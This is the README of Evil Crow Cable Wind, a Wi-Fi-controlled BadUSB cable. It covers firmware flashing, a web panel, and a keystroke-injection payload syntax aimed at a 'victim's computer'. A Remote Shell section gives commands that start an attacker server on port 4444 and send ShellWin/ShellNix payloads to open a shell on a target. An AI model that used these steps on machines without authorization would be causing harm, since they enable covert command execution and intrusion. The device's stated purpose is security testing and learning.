# EvilCrowCable-Wind

![EvilCrow](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/logo.png)

**Idea, development and implementation:** Joel Serna (@JoelSernaMoreno).

**Final PCB design:** April Brother (@aprbrother).

**Manufacturer and distributor:** April Brother (@aprbrother).

**Distributor in the United Kingdom:** KSEC Worldwide (@KSEC_KC).

The developers and collaborators of this project do not earn any money from it. 
You can invite me to a coffee to further develop low-cost hacking devices. If you don't invite me, no worries, I will keep developing devices

[![ko-fi](https://www.ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E614OA5)

**Available from April Brother (shipping from China):** 

* USB-A to USB-C: Coming soon
* USB-C to USB-C: Coming soon

**Available from KSEC Worldwide (shipping from the United Kingdom):**

* USB-A to USB-C: Coming soon
* USB-C to USB-C: Coming soon

**Summary:**

1. Disclaimer
2. Introduction
3. Firmware
	* Installation
	* First steps with Evil Crow Cable Wind
	* Home
	* Live Payload
	* Upload Payload
	* List Payloads
	* Config
	* HTTP Update
4. Add a new Keyboard Layout
5. Sintax
	* Payload Syntax
	* Keys and Modifiers Syntax
6. Remote Shell

# Disclaimer

Evil Crow Cable Wind is a basic device for professionals and cybersecurity enthusiasts.

We are not responsible for the incorrect use of Evil Crow Cable Wind.

We recommend using this device for testing, learning and fun :D

# Introduction

Evil Crow Cable Wind is a BadUSB device based on two ESP32-S3 (It only allows charging of the mobile phone).

Evil Crow Cable Wind can be controlled with a web panel over Wi-Fi, the device is configured in STATION mode. You will need to set up a Wi-Fi access point with your mobile phone or another device, Evil Crow Cable Wind will automatically connect to it.

Evil Crow Cable Wind is pre-configured with English layout (EN_US), but is compatible with other keyboard layouts:

* BE_BE
* BR_BR
* CA_CA
* CA_FR
* DA_DK
* DE_DE
* EN_US
* ES_ES
* FR_FR
* HR_HR
* IT_IT
* PT_PT

You can change the keyboard layout in real time from the web panel.

**NOTE:** 

* **Not all layouts have been tested. If you find any incorrect keys, you can change them and submit a PR to the Evil Crow Cable Wind repository.**

* **All devices have been flashed with basic firmware before shipping.**

* **Please do not request new features in this code. You can develop code for Evil Crow Cable Wind and submit a PR with your new features.**

# Firmware

## Installation

1. Install esptool: sudo apt install esptool
2. Install pyserial: sudo pip install pyserial
3. Download and Install the Arduino IDE 2.3.2: https://www.arduino.cc/en/main/software
4. Download Evil Crow Cable Wind repository: git clone https://github.com/joelsernamoreno/EvilCrowCable-Wind.git
5. Copy and unzip the USB library included in this repository (EvilCrowCable-Wind/modified-libraries/) to your Arduino library directory
6. Open Arduino IDE
7. Install "esp32 by Espressif Systems 3.0.3" in Arduino IDE
8. Flash SIDE-A.ino firmware:
	* Connect one end of the cable (USB-A or USB-C) with a magnet to the computer
	* Open EvilCrowCable-Wind/firmware/SIDE-A.ino firmware in Arduino IDE
	* Select Tools:
		- Board - "ESP32S3 Dev Module"
    	  	- USB CDC On Boot - "Disabled"
    	  	- CPU Frequency - "80MHz (Wi-Fi)
    	  	- Core Debug Level - "None"
    	  	- USB DFU On Boot - "Disabled"
    	  	- Erase All Flash Before Sketch Upload - "Disabled"
    	  	- Events Run On - "Core 1"
    	  	- Flash Mode - "QIO 80MHZ"
    	  	- Flash Size - "8MB (64Mb)"
    	  	- JTAG Adapter - "Disabled"
    	  	- Arduino Runs On - "Core 1"
    		- USB Firmware MSC On Boot - "Disabled".
    		- Partition Scheme - "8M with SPIFFS (3MB APP/1.5MB SPIFFS)"
    		- PSRAM - "Disabled"
    		- Upload Mode - "UART0 / Hardware CDC"
    		- Upload Speed - "921600"
    		- USB Mode - "Hardware CDC and JTAG"
    		- Zigbee Mode - "Disabled"
    	* Flash SIDE-A.ino firmware
9. Flash SIDE-B.ino firmware:
	* Connect the second end of the cable (USB-C) with a magnet to the computer
	* Open EvilCrowCable-Wind/firmware/SIDE-B.ino firmware in Arduino IDE
	* Select Tools:
		- Board - "ESP32S3 Dev Module"
    	  	- USB CDC On Boot - "Disabled"
    	  	- CPU Frequency - "80MHz (Wi-Fi)
    	  	- Core Debug Level - "None"
    	  	- USB DFU On Boot - "Disabled"
    	  	- Erase All Flash Before Sketch Upload - "Disabled"
    	  	- Events Run On - "Core 1"
    	  	- Flash Mode - "QIO 80MHZ"
    	  	- Flash Size - "8MB (64Mb)"
    	  	- JTAG Adapter - "Disabled"
    	  	- Arduino Runs On - "Core 1"
    		- USB Firmware MSC On Boot - "Disabled".
    		- Partition Scheme - "8M with SPIFFS (3MB APP/1.5MB SPIFFS)"
    		- PSRAM - "Disabled"
    		- Upload Mode - "UART0 / Hardware CDC"
    		- Upload Speed - "921600"
    		- USB Mode - "Hardware CDC and JTAG"
    		- Zigbee Mode - "Disabled"
    	* Flash SIDE-B.ino firmware

## First steps with Evil Crow Cable Wind

1. Set up a Wi-Fi AP with your mobile phone:
	* SSID: Evil Crow Cable Wind
	* Password: 123456789
2. Disconnect and re-connect the device to the computer (Connect the end of SIDE-A firmware).
3. Open a browser and access the web panel: http://cable-wind.local/

**Note:** If you cannot access the web panel, use the IP address assigned to Evil Crow Cable Wind.

## Home

The Home page shows interesting information about the device.

## Live Payload

The Live Payload page allows you to run payloads on a computer or mobile phone. The execution of the payloads is bidirectional:

* You can use the "Run Payload" option to run the payload on the first end of the cable (USB-A or USB-C).
* You can use the "Run Mobile" option to run the payload on the other end of the cable (USB-C).
* You can use the "Save Payload" option to save the payload in memory.

## Upload Payload

The Upload Payload page allows you to upload and store payloads in memory.

**Note:** Check the available memory on the Home page.

## List Payloads

The Live Payload page allows you to run or delete payloads stored in memory.

**Note:** From this menu you will not be able to run payloads on the two ends of the cable. This option only works from Live Payload.

## Config

The Config page allows you to change the Keyboard Layout in real time or the Wi-Fi configuration.

**Note:**

Wi-Fi configuration changes are stored.

Keyboard Layout changes are not stored. Configure your layout each time you use Evil Crow Cable Wind.

## HTTP Update

You can update the firmware without a magnet:

1. Open SIDE-A.ino in the Arduino IDE
2. Configure the options as described in the 'Installation' section
3. Click on sketch -> Export Compiled Binary
4. Open SIDE-B.ino in the Arduino IDE
5. Configure the options as described in the 'Installation' section
6. Click on sketch -> Export Compiled Binary

This will create the binaries:

* EvilCrowCable-Wind/firmware/SIDE-A/build/esp32.esp32.esp32s3/
* EvilCrowCable-Wind/firmware/SIDE-B/build/esp32.esp32.esp32s3/

![Binaries](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/binaries1.png)

![Binaries](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/binaries2.png)

7. Set up a Wi-Fi access point for Evil Crow Cable Wind and your computer
8. Connect Evil Crow Cable Wind to the Wi-Fi AP and your computer
9. Connect your computer to the Wi-Fi AP
10. Open a terminal in EvilCrowCable-Wind/firmware/SIDE-A/build/esp32.esp32.esp32s3/
11. Flash the binary SIDE-A.ino.bin with the following command: curl -F "image=@SIDE-A.ino.bin" cable-wind.local/update

![Update](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/update1.png)

12. Open a terminal in EvilCrowCable-Wind/firmware/SIDE-B/build/esp32.esp32.esp32s3/
13. Flash the binary SIDE-B.ino.bin with the following command: curl -F "image=@SIDE-B.ino.bin" cablewind-client.local/update

![Update](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/update2.png)

# Add a new Keyboard Layout

If you want to add a new keyboard layout:

1. Go to the Arduino libraries directory and create your layout in USB/src/layouts/

**Note:** Use the other layouts for reference.

![Add Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/add-layout.png)

2. Modify USB/src/USBHIDKeyboard.h and include your new layout.

![Include Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/include-layout.png)

3. Modify the SIDE-A.ino and SIDE-B.ino firmwares to change your layout in real time.

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout.png)

4. Modify config.h in SIDE-A.ino to change to your new layout from the web panel.

![Web Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/web-layout.png)

5. Flash SIDE-A.ino and SIDE-B.ino firmwares again.

# Sintax

## Payload Syntax

To develop Evil Crow Cable Wind payloads, you need to know the syntax of the interpreter. All the commands allowed in the interpreter are listed here:

* RunWin COMMAND: Runs a command or a program on the victim's computer (example: RunWin cmd)
* RunPowershellAdmin: Run powershell as administrator
* RunCmdAdmin: Run cmd as administrator
* ShellWin IP: Read the "Remote Shell" section for more information
* RunLauncher COMMAND: Runs a command or a program on the victim's computer (example: RunLauncher libreoffice)
* CtrlAltT: Run a terminal on the victim's computer
* ShellNix IP: Read the "Remote Shell" section for more information
* RunMac COMMAND: Runs a command or a program on the victim's computer (example: RunMac terminal)
* GuiR: Press WINDOWS+R on the victim's computer
* AltF2: Press ALT+F2 on the victim's computer
* GuiSpace: Press WINDOWS+SPACE on the victim's computer
* Print TEXT: Prints a text on the victim's computer (example: Print Hello World!)
* PrintLine TEXT: Prints a text and presses the ENTER key on the victim's computer (example: PrintLine Hello World!).
* Delay MILLISECONDS: Pauses before continuing payload execution (example: Delay 5000)
* Press KEY: Press a key or modifier on the victim's computer (example: Press KEY_ENTER).
* PressRelease KEY: Press and Release a key or modifier on the victim's computer (example: PressRelease KEY_ENTER)
* Release: Release all pressed keys

**NOTE:** You can find payloads for Evil Crow Cable Wind in this repository (EvilCrowCable-Wind/payloads).

## Keys and Modifiers Syntax

**MODIFIERS:**

* KEY_LEFT_ALT
* KEY_LEFT_GUI
* KEY_LEFT_CTRL
* KEY_LEFT_SHIFT
* KEY_RIGHT_ALT
* KEY_RIGHT_GUI
* KEY_RIGHT_CTRL
* KEY_RIGHT_SHIFT

**KEYS:**

* KEY_ENTER
* KEY_UP_ARROW
* KEY_DOWN_ARROW
* KEY_LEFT_ARROW
* KEY_RIGHT_ARROW
* KEY_BACKSPACE
* KEY_TAB
* KEY_PAUSE
* KEY_INSERT
* KEY_DELETE
* KEY_PAGE_UP
* KEY_PAGE_DOWN
* KEY_ESC
* KEY_SPACE
* KEY_HOME
* KEY_END
* KEY_CAPS_LOCK
* KEY_PRINT_SCREEN
* KEY_SCROLL_LOCK
* KEY_NUM_LOCK
* KEY_MENU
* LED_NUMLOCK
* LED_CAPSLOCK
* LED_SCROLLLOCK
* LED_COMPOSE
* LED_KANA
* KEY_F1
* KEY_F2
* KEY_F3
* KEY_F4
* KEY_F5
* KEY_F6
* KEY_F7
* KEY_F8
* KEY_F9
* KEY_F10
* KEY_F11
* KEY_F12

# Remote Shell

Evil Crow Cable Wind allows you to execute commands remotely on a computer without a network connection.

Evil Crow Cable Wind uses port 4444 for communication. If you want to change this, modify SIDE-A.ino:

![Port](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/port.png)

1. Run evilcrow-server.py to start the attack:

	* Windows Target: python evilcrow-server.py --port 4444 --target windows
	* Linux Target: python evilcrow-server.py --port 4444 --target linux
	
![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server.png)

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	
3. Click on 'Run Payload' (**Note:** 'Run Mobile' does not work with this attack)

**Demo:** [Remote Shell](https://www.youtube.com/watch?v=FmkIHYdOxS4)

